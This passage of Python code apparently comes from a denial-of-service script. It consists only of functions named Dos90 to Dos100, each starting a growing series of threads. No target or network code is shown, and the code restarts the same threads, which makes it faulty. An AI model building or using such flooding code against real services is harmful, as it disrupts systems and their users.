    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
def Dos90():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
def Dos91():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
def Dos92():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
def Dos93():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
def Dos94():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
    tth94.start()
def Dos95():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
    tth94.start()
    tth95.start()
def Dos96():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
    tth94.start()
    tth95.start()
    tth96.start()
def Dos97():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
    tth94.start()
    tth95.start()
    tth96.start()
    tth97.start()
def Dos98():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
    tth94.start()
    tth95.start()
    tth96.start()
    tth97.start()
    tth98.start()
def Dos99():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
    tth94.start()
    tth95.start()
    tth96.start()
    tth97.start()
    tth98.start()
    tth99.start()
def Dos100():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
    tth89.start()
    tth90.start()
    tth91.start()
    tth92.start()
    tth93.start()
    tth94.start()
    tth95.start()
    tth96.start()
    tth97.start()
    tth98.start()
    tth99.start()
    tth100.start()
